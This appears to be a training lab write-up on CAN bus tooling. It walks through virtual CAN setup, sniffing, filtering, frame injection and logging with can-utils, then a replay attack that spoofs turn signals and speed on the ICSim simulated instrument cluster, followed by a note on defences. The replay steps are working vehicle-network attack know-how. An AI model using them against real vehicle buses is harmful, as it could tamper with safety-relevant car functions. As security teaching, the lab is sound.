# Day 5

## Lab - Connecting BBB Rev D with STM32F446RE Nucleo via SN65HVD230 CAN Module

<img width="835" height="736" alt="image" src="https://github.com/user-attachments/assets/a74dfb0c-d45d-4a1e-8383-fdc449a8e6bd" />

## Lab - CAN bring-up and sniffing

Install CAN tools
```
sudo apt update
sudo apt install -y can-utils
```

CAN bring-up
```
# 1. load the virtual CAN kernel module
sudo modprobe vcan

# 2. create a virtual CAN interface named vcan0
sudo ip link add dev vcan0 type vcan

# 3. bring the interface up
sudo ip link set vcan0 up

# 4. verify it's up
ip link show vcan0
```

Terminal 1 - Basic sniff
```
candump vcan0
```

Terminal 2 - Send some CAN frames
```
cansend vcan0 123#DEADBEEF
cansend vcan0 456#0011223344556677
cansend vcan0 7DF#020100
```

Watch on Terminal 1
<pre>
- This is basic CAN sniffing
  - capturing and viewing bus traffic
- The format is: 
  - interface
  - CAN ID[data length]
  - data bytes.
</pre>
```
vcan0  123   [4]  DE AD BE EF
vcan0  456   [8]  00 11 22 33 44 55 66 77
vcan0  7DF   [3]  02 01 00
```


Generate continuous traffic (simulate a busy bus)
```
# generate random frames every 100ms
cangen vcan0 -g 100 -I i -L 8 -D r -v
```

Advanced sniffing (analyze changing data)
```
cansniffer vcan0
```

To sniff only specific IDs:
```
cansniffer vcan0            # all IDs
candump vcan0,123:7FF       # filter: only ID 0x123
```

Filtering (focus on specific messages)
```
# only show ID 0x123
candump vcan0,123:7FF

# show a range or multiple filters
candump vcan0,100:700,456:7FF

# show everything EXCEPT a certain ID (inverted filter)
candump vcan0,0:0,~123:7FF
```

Injection ( Send crafated frames )
```
cansend vcan0 123#DEADBEEF          # one specific frame
cansend vcan0 200#1122334455667788  # another
```

Logging and Replay
```
# capture to a log file
candump -l vcan0
# (let some traffic flow, e.g. cangen running, then Ctrl+C)

# see the log
ls -l candump-*.log

# replay the captured traffic
canplayer -I candump-*.log
```

If you prefer a script
<pre>
#!/bin/bash
  
# --- Bring-up ---
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan
sudo ip link set vcan0 up
ip link show vcan0

# --- Sniff (Terminal 1) ---
candump vcan0

# --- Send/inject (Terminal 2) ---
cansend vcan0 123#DEADBEEF

# --- Generate traffic (Terminal 3) ---
cangen vcan0 -g 100 -I i -L 8 -D r -v

# --- Analytical sniffer ---
cansniffer vcan0

# --- Filter ---
candump vcan0,123:7FF

# --- Log and replay ---
candump -l vcan0          # Ctrl+C to stop
canplayer -I candump-*.log
</pre>

Cleanup
```
sudo ip link set vcan0 down
sudo ip link delete vcan0
```

## Lab - ICSim Replay Attack

Install the tools
```
sudo apt update
sudo apt install -y can-utils libsdl2-dev libsdl2-image-dev git
git clone https://github.com/zombieCraig/ICSim.git
cd ICSim && make          # builds icsim and controls
```

Bring up the virtual CAN bus
```
sudo modprobe vcan
sudo ip link add dev vcan0 type vcan 2>/dev/null
sudo ip link set vcan0 up
ip link show vcan0        # confirm UP
```

Start the simulated vehicle (run on the desktop, not headless SSH)
```
cd ~/ICSim
./icsim vcan0             # the instrument cluster (dashboard) window
./controls vcan0          # the control panel window
```

Sniff/Monitor to see the live traffic
```
candump vcan0
```

CAPTURE legitimate traffic
```
candump -l vcan0
```
<pre>
- While this runs, in the controls window 
  - turn on the LEFT turn signal and accelerate to a noticeable speed. 
  - do it for ~10 seconds, then stop the capture with Ctrl+C.
</pre>

Confirm the log was created
```
ls -l candump-*.log
```


Reset the vehicle to a known state
<pre>
- In the controls window, turn the turn signal OFF and slow to zero
- The dashboard should now show no signal and zero speed
- This makes the attack unmistakable, the cluster is currently idle
</pre>

REPLAY the captured traffic (the attack)
```
canplayer -I candump-*.log
# cansniffer vcan0
```

Points to understand
<pre>
- CAN has no authentication and no built-in freshness/anti-replay
- The cluster cannot distinguish a genuine command from a replayed recording
- So an attacker who can record bus traffic can replay it to control functions
- Defenses to discuss:
  - Message authentication (signed/MAC'd frames).
  - Freshness (rolling counters/timestamps so old frames are rejected)  
</pre>
